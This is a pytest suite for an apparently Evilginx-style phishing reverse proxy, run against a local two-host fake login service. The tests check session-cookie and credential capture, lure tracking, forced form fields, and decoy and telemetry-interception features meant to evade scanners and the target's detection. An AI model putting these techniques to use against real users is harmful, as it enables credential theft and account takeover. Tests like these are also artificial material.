"""Phishlet v2 + proxy integration tests — multi-host chains, rewriting,
injection, session-token capture, force_post, decoy, lures and JA3.

The fake upstream serves TWO hosts (127.0.0.1 = the login host, localhost = the
app host) so the multi-domain chain a real IdP uses is actually exercised: the
proxy must route each request to the right upstream and follow the victim across
hosts, which a single-upstream proxy cannot do.

Run:  ./.venv/bin/python -m pytest tests/test_phishlet.py -v
"""
import http.client
import http.server
import json
import os
import shutil
import socket
import socketserver
import subprocess
import tempfile
import threading
import time
import urllib.parse

import pytest
from conftest import free_port

from core import capture as cap
from core import lures as lures_mod
from core import tls_fp
from core.phishlet import (
    AuthToken,
    CredentialField,
    ForcePost,
    JsInject,
    Phishlet,
    ProxyHost,
    SubFilter,
)
from core.proxy import CAPTURE_PATH, HOOK_PATH, ProxyEngine, serve_proxy

# tier marker: the Makefile and pyproject document `pytest -m integration` (run_all.py ignores markers and runs every file)
pytestmark = pytest.mark.integration


HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

LOGIN_HTML = """<!doctype html><html><head><title>Sign in</title>
<script src="http://127.0.0.1:{port}/static/app.js"></script>
</head><body>
<form method="post" action="http://127.0.0.1:{port}/sessions">
  <input name="username"><input name="password" type="password">
  <input type="checkbox" name="remember_me" value="0">
</form>
<a href="http://127.0.0.1:{port}/help">help</a>
</body></html>"""

APP_HTML = """<!doctype html><html><head><title>Dashboard</title></head>
<body><h1 id="hello">Welcome back</h1></body></html>"""


class Upstream(http.server.BaseHTTPRequestHandler):
    """Two virtual hosts on one socket, selected by the Host header."""

    def log_message(self, *a):
        pass

    def _send(self, body, status=200, cookies=(), ctype="text/html"):
        raw = body.encode() if isinstance(body, str) else body
        self.send_response(status)
        self.send_header("Content-Type", ctype)
        for c in cookies:
            self.send_header("Set-Cookie", c)
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)

    def _host(self):
        return (self.headers.get("Host") or "").split(":")[0]

    def _note(self):
        seen = getattr(self.server, "seen", None)
        if seen is not None:
            seen.append((self.command, self._host(),
                         urllib.parse.urlparse(self.path).path))

    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path
        host = self._host()
        self._note()
        if path == "/static/app.js":
            self._send("console.log('app');", ctype="application/javascript")
            return
        if host == "localhost":                      # the app host
            if "auth_token=" in (self.headers.get("Cookie") or ""):
                self._send(APP_HTML)
            else:
                self._send("redirecting", status=302)
            return
        if path in ("/", "/login"):
            port = self.server.server_address[1]
            self._send(LOGIN_HTML.format(port=port),
                       cookies=["sid=abc123; Path=/; HttpOnly"])
            return
        if path == "/app":
            # reached only after the POST below: this is the "authenticated" URL
            self._send(APP_HTML, cookies=["auth_token=TOK-9; Path=/; HttpOnly"])
            return
        self._send("nope", status=404)

    def do_POST(self):
        n = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(n).decode("utf-8", "replace")
        path = urllib.parse.urlparse(self.path).path
        self._note()
        if path == "/sessions":
            form = {k: v[0] for k, v in urllib.parse.parse_qs(body).items()}
            self.server.last_post = form
            if form.get("password"):
                self.send_response(302)
                self.send_header("Location", f"http://localhost:{self.server.server_address[1]}/app")
                self.send_header("Set-Cookie", "auth_token=TOK-9; Path=/; HttpOnly")
                self.send_header("Content-Length", "0")
                self.end_headers()
            else:
                self._send("bad", status=401)
            return
        self._send("nope", status=404)


class UpstreamServer:
    def __enter__(self):
        self.port = free_port()
        self.httpd = socketserver.ThreadingTCPServer(("127.0.0.1", self.port), Upstream)
        self.httpd.daemon_threads = True
        self.httpd.last_post = {}
        self.httpd.seen = []
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
        time.sleep(0.2)
        return self

    def __exit__(self, *e):
        self.httpd.shutdown()
        self.httpd.server_close()
        return False


def two_host_phishlet(port, **over):
    """A realistic two-host phishlet with every v2 feature enabled."""
    kwargs = {
        "name": "acme-sso",
        "proxy_hosts": [
            ProxyHost(domain="127.0.0.1", phish_sub="", orig_sub="", session=True,
                      is_landing=True, port=port, scheme="http"),
            ProxyHost(domain="localhost", phish_sub="", orig_sub="", session=True,
                      is_landing=False, port=port, scheme="http"),
        ],
        "sub_filters": [
            SubFilter(search=rf"127\.0\.0\.1:{port}", replace="{hostname}",
                      mimes=["text/html", "application/javascript"]),
        ],
        "js_inject": [
            JsInject(payload="window.__bh_hooked=true;",
                     trigger_domains=["127.0.0.1"], trigger_paths=["^/$", "^/login"],
                     mimes=["text/html"]),
        ],
        # the upstream sets auth_token on the host we request, so that is where
        # the phishlet scopes it (a mismatch means the token is not ours)
        "auth_tokens": [AuthToken(keys=["auth_token"], domain="127.0.0.1")],
        "auth_urls": [r"/app$"],
        "credentials": {"username": CredentialField("username", "(.*)", "post"),
                     "password": CredentialField("password", "(.*)", "post")},
        "force_post": [ForcePost(path="/sessions",
                              search=[{"key": "username", "search": ".*"}],
                              force=[{"key": "remember_me", "value": "1"}])],
        "capture_cookies": ["*"], "inject_paths": [".*"], "strip_integrity": True,
        "verify_tls": False,
    }
    kwargs.update(over)
    return Phishlet(**kwargs)


class Proxy:
    def __init__(self, phishlet, db, tls=False, cert=None, gate=None):
        self.engine = ProxyEngine(phishlet, db=db, geo_provider="off",
                                  logger=lambda *a: None, gate=gate)
        self.port = free_port()
        self.captures = []
        self.engine.on_capture = self.captures.append
        self.httpd = serve_proxy(self.engine, self.port, campaign="ph-test",
                                 tls=tls, cert_path=cert)
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
        time.sleep(0.25)

    def req(self, method, path, host, body=None, headers=None, port=None,
            jar=None):
        """One request through the proxy, carrying the __bhs cookie like a
        real victim's browser does (without it every request is a NEW session,
        which is what made the first version of these tests lie)."""
        conn = http.client.HTTPConnection("127.0.0.1", port or self.port, timeout=15)
        h = {"Host": host}
        if jar:
            h["Cookie"] = "; ".join(f"{k}={v}" for k, v in jar.items())
        h.update(headers or {})
        conn.request(method, path, body=body, headers=h)
        r = conn.getresponse()
        data = r.read()
        pairs = r.getheaders()
        status = r.status
        conn.close()
        if jar is not None:
            for k, v in pairs:
                if k.lower() == "set-cookie":
                    name, _, rest = v.partition("=")
                    jar[name.strip()] = rest.split(";")[0]
        return status, data, pairs

    def stop(self):
        self.httpd.shutdown()


@pytest.fixture()
def db():
    d = cap.CaptureDB(os.path.join(tempfile.mkdtemp(prefix="bh_ph_"), "p.db"))
    yield d
    d.close()


# ======================================================== phishlet engine ===
class TestPhishletEngine:
    def test_multi_host_routing(self):
        ph = two_host_phishlet(8080)
        assert ph.host_for("127.0.0.1:8080").phish_host == "127.0.0.1"
        assert ph.host_for("localhost").phish_host == "localhost"
        # an unknown host falls back to the landing host
        assert ph.host_for("evil.test").is_landing is True
        assert ph.landing_host().domain == "127.0.0.1"

    def test_legacy_flat_constructor_still_works(self):
        ph = Phishlet(upstream="login.example.test", capture_cookies=["sid"],
                      inject_paths=[r"^/login"])
        assert ph.proxy_hosts and ph.proxy_hosts[0].domain == "example.test"
        assert ph.proxy_hosts[0].orig_sub == "login"
        assert ph.base_url == "https://login.example.test"
        assert ph.wants_injection("/login") and not ph.wants_injection("/other")
        assert ph.wants_cookie("sid") and not ph.wants_cookie("tracker")

    def test_sub_filter_mime_and_trigger_scoping(self):
        f = SubFilter(search="acme", replace="mine", mimes=["text/html"],
                      triggers_on="login.")
        assert f.applies("login.acme.test", "text/html; charset=utf-8")
        assert not f.applies("cdn.acme.test", "text/html")        # trigger mismatch
        assert not f.applies("login.acme.test", "image/png")      # mime mismatch
        out = f.apply("acme acme", {"hostname": "mine"})
        assert out == "mine mine"

    def test_auth_token_modifiers(self):
        t = AuthToken(keys=["sess", "frog-[0-9]{3}:regexp", "opt_one:opt"])
        assert t.matches("sess") == (True, False)
        assert t.matches("frog-283") == (True, False)
        assert t.matches("opt_one") == (True, True)
        assert t.matches("nope") == (False, False)

    def test_session_complete_requires_every_required_token(self):
        ph = two_host_phishlet(8080)
        assert ph.session_complete([]) is False
        assert ph.session_complete(["auth_token"]) is True
        # an auth_url hit also completes the session
        assert ph.session_complete([], "/app") is True
        assert ph.session_complete([], "/login") is False

    def test_optional_tokens_do_not_block_completion(self):
        ph = Phishlet(upstream="x.test",
                      auth_tokens=[{"keys": ["a"], "domain": "x.test"},
                                   {"keys": ["b:opt"], "domain": "x.test"}])
        assert ph.session_complete(["a"]) is True
        assert ph.session_complete(["b"]) is False

    def test_credential_extraction_post_and_json(self):
        cf = CredentialField("username", "(.*)", "post")
        assert cf.extract("username=alice&password=p") == "alice"
        assert cf.extract("username=a%40b.c&x=1") == "a@b.c"
        jf = CredentialField("login", "(.*)", "json")
        assert jf.extract(json.dumps({"login": "bob"})) == "bob"
        assert jf.extract("not json") is None

    def test_force_post_only_matches_its_path_and_markers(self):
        fp = ForcePost(path="/sessions", search=[{"key": "username"}],
                       force=[{"key": "remember_me", "value": "1"}])
        assert fp.applies("/sessions", "username=a") is True
        assert fp.applies("/other", "username=a") is False
        assert fp.applies("/sessions", "password=p") is False
        assert fp.apply("username=a") == "username=a&remember_me=1"

    def test_template_params_and_child_phishlets(self):
        ph = Phishlet(upstream="{tenant}.okta.com", params={"tenant": ""},
                      name="okta-template")
        child = ph.child("acme-okta", tenant="acme")
        # the phishlet convention keeps domain + sub separate; what matters is
        # that the substituted upstream host is right
        assert child.proxy_hosts[0].orig_host == "acme.okta.com"
        assert child.name == "acme-okta"
        assert child.params["tenant"] == "acme"

    def test_yaml_round_trip(self, tmp_path):
        ph = two_host_phishlet(8080)
        path = tmp_path / "acme.yaml"
        ph.to_yaml(str(path))
        back = Phishlet.load(str(path))
        assert back.name == ph.name
        assert len(back.proxy_hosts) == 2
        assert back.auth_urls == ph.auth_urls
        assert back.force_post[0].force[0]["value"] == "1"
        assert back.session_complete(["auth_token"]) is True

    def test_json_load(self, tmp_path):
        ph = two_host_phishlet(8080)
        path = tmp_path / "acme.json"
        with open(path, "w") as f:
            json.dump(ph.to_dict(), f)
        back = Phishlet.load(str(path))
        assert back.describe().startswith("acme-sso")


# =========================================================== proxy in front =
class TestProxyV2:
    def test_multi_host_chain_end_to_end(self, db):
        with UpstreamServer() as up:
            ph = two_host_phishlet(up.port)
            p = Proxy(ph, db)
            jar = {}
            try:
                # 1) victim lands on the login host
                st, body, pairs = p.req("GET", "/", "127.0.0.1", jar=jar)
                html = body.decode()
                assert st == 200 and "Sign in" in html
                # sub_filter rewrote the upstream origin to our host
                assert f"127.0.0.1:{up.port}/sessions" not in html
                # js_inject payload present
                assert "window.__bh_hooked=true" in html
                # hook + collector injected
                assert HOOK_PATH in html and "/__bh/intel.js" in html

                # 2) victim submits credentials -> force_post adds remember_me
                form = urllib.parse.urlencode({"username": "victim@acme.test",
                                               "password": "S3cret!"})
                st, body, pairs = p.req("POST", "/sessions", "127.0.0.1",
                                        body=form, jar=jar,
                                        headers={"Content-Type":
                                                 "application/x-www-form-urlencoded"})
                assert st == 302
                assert up.httpd.last_post.get("remember_me") == "1"   # injected
                assert up.httpd.last_post.get("username") == "victim@acme.test"

                # 3) the upstream set auth_token -> session must be complete
                time.sleep(0.3)
                sess = list(p.engine.sessions.values())[0]
                assert sess.session_complete is True
                assert "auth_token" in sess.tokens
                kinds = [c.get("type") for c in p.captures]
                assert "session" in kinds
                alert = [c for c in p.captures if c.get("type") == "session"][0]
                assert alert["cookies"] and alert["credentials"]["username"] == "victim@acme.test"

                # 4) vault persisted with cookies + creds + state
                rec = db.session_get(sess.sid)
                assert rec and rec["state"] in ("session", "creds")
                assert any(c["name"] == "auth_token" for c in rec["cookies"])
                assert rec["credentials"]["password"] == "S3cret!"
                assert rec["phishlet"] == "acme-sso"

                # 5) the victim follows the redirect to the APP host (the other
                #    upstream). The fixture's two hosts (127.0.0.1 and localhost) are
                #    unrelated names, and the upstream's cookie carries no Domain, so
                #    RFC 6265 says it belongs to 127.0.0.1 alone: a real browser would
                #    not send it to localhost either. The cookie must therefore NOT
                #    travel - forwarding it blindly (what an unscoped jar join did) is
                #    how one upstream's session ends up offered to an unrelated one.
                st, body, _ = p.req("GET", "/app", "localhost", jar=jar)
                assert st == 302, "a cookie for another host must not be forwarded"

                # 6) ...but a cookie whose scope DOES cover the app host is forwarded,
                #    which is how a real multi-host phishlet keeps the victim signed in
                #    (login.acme.com and app.acme.com both under Domain=.acme.com).
                #    The fixture's two hosts share no parent domain, so the shared
                #    cookie is expressed by naming the app host explicitly in the
                #    upstream jar.
                from http.cookiejar import Cookie
                sess.cookies.set_cookie(Cookie(
                    0, "auth_token", "TOK-9", None, False, "localhost", True, False,
                    "/", True, False, None, False, None, None, {}))
                st, body, _ = p.req("GET", "/app", "localhost", jar=jar)
                assert st == 200 and "Welcome back" in body.decode()
            finally:
                p.stop()

    def test_token_scoped_to_another_host_is_not_captured(self, db):
        """Domain scoping must be enforced, not bypassed by an unscoped retry."""
        with UpstreamServer() as up:
            ph = two_host_phishlet(up.port)
            ph.auth_tokens = [AuthToken(keys=["auth_token"], domain="elsewhere.test")]
            p = Proxy(ph, db)
            try:
                jar = {}
                p.req("GET", "/", "127.0.0.1", jar=jar)
                p.req("POST", "/sessions", "127.0.0.1", jar=jar,
                      body=urllib.parse.urlencode({"username": "v@x.test",
                                                   "password": "p"}),
                      headers={"Content-Type": "application/x-www-form-urlencoded"})
                time.sleep(0.3)
                sess = list(p.engine.sessions.values())[0]
                assert "auth_token" not in sess.tokens
            finally:
                p.stop()

    def test_anonymous_cookie_does_not_complete_a_session(self, db):
        """A cookie set before any credential submit is not a captured session."""
        with UpstreamServer() as up:
            ph = two_host_phishlet(up.port)
            ph.auth_tokens = [AuthToken(keys=["sid"], domain="127.0.0.1")]
            ph.auth_urls = []
            p = Proxy(ph, db)
            try:
                jar = {}
                p.req("GET", "/", "127.0.0.1", jar=jar)      # landing page only
                time.sleep(0.2)
                sess = list(p.engine.sessions.values())[0]
                assert sess.session_complete is False
                assert sess.vault["state"] != "session"
            finally:
                p.stop()

    def test_rewrite_target_is_the_public_host(self, db):
        """With a public host set, every foreign origin points at our host."""
        with UpstreamServer() as up:
            eng_ph = two_host_phishlet(up.port)
            p = Proxy(eng_ph, db)
            p.engine.public_host = "phish.example.test"
            try:
                host = eng_ph.host_for("127.0.0.1")
                out = p.engine.apply_sub_filters(
                    f"a 127.0.0.1:{up.port} b", host, "text/html", "/")
                assert "phish.example.test" in out
                assert f"127.0.0.1:{up.port}" not in out
            finally:
                p.stop()

    def test_no_public_host_skips_rewrites_instead_of_pointing_at_the_vendor(self, db):
        """Measured on a live upstream: the fallback rewrote githubassets.com to
        github.com - the real vendor domain. Skipping is the correct behaviour."""
        with UpstreamServer() as up:
            ph = two_host_phishlet(up.port)
            logged = []
            p = Proxy(ph, db)
            p.engine.log = logged.append
            p.engine.public_host = ""
            try:
                host = ph.host_for("127.0.0.1")
                text = f"origin 127.0.0.1:{up.port} here"
                out = p.engine.apply_sub_filters(text, host, "text/html", "/")
                assert out == text, "must not rewrite without a target host"
                assert any("no public host" in m for m in logged)
                # and it says so only once, not per request
                p.engine.apply_sub_filters(text, host, "text/html", "/")
                assert len([m for m in logged if "no public host" in m]) == 1
            finally:
                p.stop()

    def test_configured_phish_sub_is_used_when_no_public_host(self, db):
        """A phishlet that deliberately sets a subdomain is a configured choice."""
        with UpstreamServer() as up:
            ph = two_host_phishlet(up.port)
            ph.proxy_hosts[0].phish_sub = "login"
            p = Proxy(ph, db)
            p.engine.public_host = ""
            try:
                host = ph.host_for("127.0.0.1")
                out = p.engine.apply_sub_filters(
                    f"127.0.0.1:{up.port}", host, "text/html", "/")
                assert "login.127.0.0.1" in out
            finally:
                p.stop()

    def test_credentials_are_extracted_by_the_phishlet(self, db):
        with UpstreamServer() as up:
            p = Proxy(two_host_phishlet(up.port), db)
            try:
                jar = {}
                p.req("GET", "/", "127.0.0.1", jar=jar)
                sid = list(p.engine.sessions.values())[0].sid
                payload = json.dumps({"sid": sid,
                                      "fields": {"username": "u@x.test",
                                                 "password": "pw",
                                                 "remember_me": "0"},
                                      "fingerprint": {"ua": "Mozilla/5.0"}}).encode()
                st, body, _ = p.req("POST", CAPTURE_PATH, "127.0.0.1", body=payload,
                                    jar=jar,
                                    headers={"Content-Type": "application/json"})
                assert st == 200
                rec = db.session_get(sid)
                assert rec["credentials"]["username"] == "u@x.test"
                assert rec["credentials"]["password"] == "pw"
                # remember_me is not a credential
                assert "remember_me" not in rec["credentials"]
            finally:
                p.stop()

    def test_absolute_form_uri_still_blocked_with_multi_host(self, db):
        with UpstreamServer() as up:
            p = Proxy(two_host_phishlet(up.port), db)
            try:
                conn = http.client.HTTPConnection("127.0.0.1", p.port, timeout=10)
                conn.putrequest("GET", "http://169.254.169.254/latest/meta-data/",
                                skip_host=True, skip_accept_encoding=True)
                conn.putheader("Host", "127.0.0.1")
                conn.endheaders()
                r = conn.getresponse()
                body = r.read().decode("utf-8", "replace")
                conn.close()
                assert "meta-data" not in body
                assert r.status in (502, 404, 200) and "ami-id" not in body
            finally:
                p.stop()

    def test_lure_tracking_and_conversion(self, db):
        with UpstreamServer() as up:
            p = Proxy(two_host_phishlet(up.port), db)
            try:
                lure = db.lure_create(lures_mod.Lure(phishlet="acme-sso", campaign="q3",
                                                     label="victim@corp.test", kind="link"))
                jar = {}
                st, body, _ = p.req("GET", f"/l/{lure.token}", "127.0.0.1", jar=jar)
                assert st == 200 and "Sign in" in body.decode()
                stored = db.lure_get(lure.token)
                assert stored.opens == 1 and "127.0.0.1" in stored.visitors
                sess = list(p.engine.sessions.values())[0]
                assert sess.lure == lure.token
                # a capture that completes the session converts the lure
                p.req("POST", "/sessions", "127.0.0.1", jar=jar,
                      body=urllib.parse.urlencode({"username": "v@x.test",
                                                   "password": "p"}),
                      headers={"Content-Type": "application/x-www-form-urlencoded"})
                time.sleep(0.3)
                assert db.lure_get(lure.token).conversions >= 1
                assert db.session_get(sess.sid)["lure"] == lure.token
            finally:
                p.stop()

    def test_one_time_lure_burns_and_second_visitor_gets_decoy(self, db):
        with UpstreamServer() as up:
            ph = two_host_phishlet(up.port, decoy="page", unauth_url="")
            p = Proxy(ph, db)
            try:
                lure = db.lure_create(lures_mod.Lure(phishlet="acme-sso", kind="one-time",
                                                     max_uses=1))
                st, _, _ = p.req("GET", f"/l/{lure.token}", "127.0.0.1")
                assert st == 200
                st2, body2, _ = p.req("GET", f"/l/{lure.token}", "127.0.0.1")
                assert st2 == 503 and b"Service unavailable" in body2
                assert db.lure_get(lure.token).uses == 1     # never counted twice
            finally:
                p.stop()

    def test_hidden_phishlet_serves_decoy_to_unknown_visitors(self, db):
        with UpstreamServer() as up:
            ph = two_host_phishlet(up.port, hide=True, decoy="page")
            p = Proxy(ph, db)
            try:
                st, body, _ = p.req("GET", "/", "127.0.0.1")
                assert st == 503 and b"Service unavailable" in body
                # with a valid lure the same visitor gets the real page
                lure = db.lure_create(lures_mod.Lure(phishlet="acme-sso", kind="link"))
                st2, body2, _ = p.req("GET", f"/l/{lure.token}", "127.0.0.1")
                assert st2 == 200 and b"Sign in" in body2
            finally:
                p.stop()

    def test_decoy_real_mode_mirrors_the_upstream(self, db):
        with UpstreamServer() as up:
            ph = two_host_phishlet(up.port, hide=True, decoy="real")
            p = Proxy(ph, db)
            try:
                st, body, _ = p.req("GET", "/", "127.0.0.1")
                # a scanner sees the real login page, not a 403/503 tell
                assert st == 200 and b"Sign in" in body
            finally:
                p.stop()

    def test_unauth_url_redirect_mode(self, db):
        with UpstreamServer() as up:
            ph = two_host_phishlet(up.port, hide=True, decoy="url",
                                   unauth_url="https://example.com/")
            p = Proxy(ph, db)
            try:
                conn = http.client.HTTPConnection("127.0.0.1", p.port, timeout=10)
                conn.request("GET", "/", headers={"Host": "127.0.0.1"})
                r = conn.getresponse()
                r.read()
                conn.close()
                assert r.status == 302
                assert dict(r.getheaders()).get("Location") == "https://example.com/"
            finally:
                p.stop()


# =================================================================== JA3 ====
class TestJA3:
    def test_client_hello_parser_on_a_real_handshake(self):
        """Parse the ClientHello our own TLS client sends (real bytes, no mocks)."""
        import ssl
        port = free_port()
        listener = socket.socket()
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(("127.0.0.1", port))
        listener.listen(1)
        got = {}

        def serve():
            conn, _ = listener.accept()
            got["hello"] = tls_fp.peek_client_hello(conn)
            conn.close()

        t = threading.Thread(target=serve, daemon=True)
        t.start()
        time.sleep(0.2)
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            s = ctx.wrap_socket(socket.create_connection(("127.0.0.1", port), timeout=5),
                                server_hostname="example.test")
            s.close()
        except Exception:
            pass
        t.join(timeout=5)
        listener.close()
        hello = tls_fp.parse_client_hello(got.get("hello") or b"")
        assert hello, "ClientHello not parsed"
        fp = tls_fp.ja3_full(hello)
        assert len(fp["ja3"]) == 32
        assert fp["cipher_count"] > 0 and fp["extension_count"] > 0
        assert fp["sni"] == "example.test"
        assert ":" not in fp["ja3_string"].split(",")[0]

    def test_garbage_is_not_a_client_hello(self):
        assert tls_fp.parse_client_hello(b"GET / HTTP/1.1\r\n\r\n") == {}
        assert tls_fp.parse_client_hello(b"") == {}
        assert tls_fp.ja3_full({}) == {}

    def test_bot_likelihood_from_tls_alone(self):
        minimal = {"tls_version": 771, "ciphers": [4865, 4866], "extensions": [0, 10],
                   "groups": [29], "point_formats": [0]}
        fp = tls_fp.ja3_full(minimal)
        score, reasons = tls_fp.bot_likelihood(fp, "Mozilla/5.0 (Windows NT 10.0) "
                                                    "Chrome/124.0 Safari/537.36")
        assert score >= 45 and reasons
        assert any("minimal" in r or "scripted" in r for r in reasons)

    def test_modern_browser_shape_is_not_flagged(self):
        hello = {"tls_version": 772, "ciphers": list(range(20)),
                 "extensions": list(range(15)), "groups": [29, 23],
                 "point_formats": [0], "alpn": ["h2", "http/1.1"], "sni": "x.test"}
        score, _ = tls_fp.bot_likelihood(tls_fp.ja3_full(hello),
                                         "Mozilla/5.0 Chrome/124.0")
        assert score == 0

    def test_ja3_is_stable_and_discriminating(self):
        a = {"tls_version": 771, "ciphers": [1, 2, 3], "extensions": [0, 10, 11],
             "groups": [29], "point_formats": [0]}
        b = dict(a, ciphers=[1, 2, 4])
        assert tls_fp.ja3_hash(a) == tls_fp.ja3_hash(dict(a))
        assert tls_fp.ja3_hash(a) != tls_fp.ja3_hash(b)

    def test_grease_values_are_filtered(self):
        with_grease = {"tls_version": 772, "ciphers": [0x0a0a, 4865],
                       "extensions": [0x1a1a, 0], "groups": [0x2a2a, 29],
                       "point_formats": [0]}
        assert tls_fp.ja3_hash(with_grease) == tls_fp.ja3_hash(
            {"tls_version": 772, "ciphers": [4865], "extensions": [0],
             "groups": [29], "point_formats": [0]})


class TestTLSServerFingerprinting:
    """A real TLS handshake through the proxy records a JA3 in the vault."""

    def _cert(self, tmp_path):
        cert = str(tmp_path / "srv_cert.pem")
        key = str(tmp_path / "srv_key.pem")
        subprocess.run(["openssl", "req", "-x509", "-newkey", "rsa:2048",
                        "-keyout", key, "-out", cert, "-days", "2", "-nodes",
                        "-subj", "/CN=localhost"],
                       check=True, capture_output=True)
        return cert

    def test_ja3_captured_over_real_tls(self, db, tmp_path):
        pytest.importorskip("ssl")
        if not shutil.which("openssl"):
            pytest.skip("openssl not available")
        cert = self._cert(tmp_path)
        with UpstreamServer() as up:
            p = Proxy(two_host_phishlet(up.port), db, tls=True, cert=cert)
            try:
                import ssl
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(socket.create_connection(("127.0.0.1", p.port),
                                                             timeout=10),
                                    server_hostname="127.0.0.1")
                s.sendall(b"GET / HTTP/1.1\r\nHost: 127.0.0.1\r\n"
                          b"Connection: close\r\n\r\n")
                data = s.recv(4000)
                s.close()
                assert b"200" in data.split(b"\r\n")[0]
                sess = list(p.engine.sessions.values())[0]
                assert sess.ja3.get("ja3"), "JA3 not captured"
                assert len(sess.ja3["ja3"]) == 32
                assert sess.ja3.get("ja3_string")
                # A bare page view no longer writes a session row (300 views
                # produced 300 rows), so persist the way a real campaign does - with a
                # capture - and then check that the JA3 travelled with it.
                s2 = ctx.wrap_socket(socket.create_connection(("127.0.0.1", p.port),
                                                              timeout=10),
                                     server_hostname="127.0.0.1")
                body = b"username=v%40corp.test&password=S3cret"
                s2.sendall(b"POST /session HTTP/1.1\r\nHost: 127.0.0.1\r\n"
                           + f"Cookie: __bhs={sess.sid}\r\n".encode()
                           + b"Content-Type: application/x-www-form-urlencoded\r\n"
                           + f"Content-Length: {len(body)}\r\n".encode()
                           + b"Connection: close\r\n\r\n" + body)
                s2.recv(4000)
                s2.close()
                rec = db.session_get(sess.sid)
                assert rec, "a credential capture did not store the session"
                assert rec["ja3"]["ja3"] == sess.ja3["ja3"]
            finally:
                p.stop()

    def test_tls_without_cert_refuses_to_start(self, db):
        with pytest.raises(ValueError):
            serve_proxy(ProxyEngine(two_host_phishlet(9999), db=db, geo_provider="off"),
                        free_port(), tls=True, cert_path=None)


class TestIntercept:
    """`intercept` answers a matching request locally. The point is that the request never
    reaches the real host: a telemetry endpoint otherwise sees our injected page's
    fingerprint, and content we cannot rewrite breaks the page."""

    def _proxy(self, db, upstream, **phishlet_over):
        over = {"intercepts": [{"path": r"/api/telemetry.*", "method": "POST",
                                "body": '{"ok":true}', "content_type": "application/json"}]}
        over.update(phishlet_over)
        engine = ProxyEngine(two_host_phishlet(upstream.port, **over), db=db,
                             geo_provider="off", logger=lambda *a: None)
        port = free_port()
        httpd = serve_proxy(engine, port, campaign="intercept-test")
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        time.sleep(0.25)
        return httpd, port

    def _request(self, port, method, path, host="127.0.0.1", body=None, ctype=None):
        conn = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
        headers = {"Host": host, "User-Agent": "Mozilla/5.0"}
        if ctype:
            headers["Content-Type"] = ctype
        conn.request(method, path, body=body, headers=headers)
        r = conn.getresponse()
        out = (r.status, dict(r.getheaders()), r.read().decode("utf-8", "replace"))
        conn.close()
        return out

    def test_an_intercepted_request_never_reaches_the_upstream(self, db):
        with UpstreamServer() as up:
            httpd, port = self._proxy(db, up)
            try:
                status, headers, body = self._request(port, "POST", "/api/telemetry/v1",
                                                      body='{"event":"x"}',
                                                      ctype="application/json")
                assert status == 200 and body == '{"ok":true}', (status, body)
                assert headers.get("Content-Type", "").startswith("application/json")
                assert not [p for p in up.httpd.seen if "telemetry" in p[2]], \
                    f"the intercepted path reached the upstream: {up.httpd.seen}"
            finally:
                httpd.shutdown()

    def test_everything_else_still_proxies(self, db):
        with UpstreamServer() as up:
            httpd, port = self._proxy(db, up)
            try:
                status, _headers, body = self._request(port, "GET", "/login")
                assert status == 200 and "hook" in body.lower() or "__bh" in body
                assert [p for p in up.httpd.seen if p[2] == "/login"], up.httpd.seen
            finally:
                httpd.shutdown()

    def test_the_method_restriction_is_honoured(self, db):
        with UpstreamServer() as up:
            httpd, port = self._proxy(db, up)
            try:
                # a GET on the intercepted path is forwarded (the intercept is POST-only)
                self._request(port, "GET", "/api/telemetry/v1")
                assert [p for p in up.httpd.seen if "telemetry" in p[2]], \
                    "a GET was intercepted despite the POST-only rule"
            finally:
                httpd.shutdown()

    def test_a_head_intercept_sends_no_body(self, db):
        with UpstreamServer() as up:
            httpd, port = self._proxy(db, up, intercepts=[
                {"path": r"/api/telemetry.*", "body": '{"ok":true}'}])
            try:
                status, headers, body = self._request(port, "HEAD", "/api/telemetry/v1")
                assert status == 200 and body == ""
                assert int(headers.get("Content-Length") or 0) == len('{"ok":true}')
            finally:
                httpd.shutdown()

    def test_the_phishlet_reports_its_intercepts(self):
        p = Phishlet(name="t", upstream="x.test",
                     intercepts=[{"path": "/a", "body": "{}"}])
        assert p.intercept_for("/a") is not None
        assert p.intercept_for("/b") is None
        assert p.intercepts[0].to_dict()["body"] == "{}"

    def test_a_broken_regex_does_not_match_everything(self):
        from core.phishlet import Intercept
        bad = Intercept(path="[unclosed", body="{}")
        assert bad.matches("/anything") is False
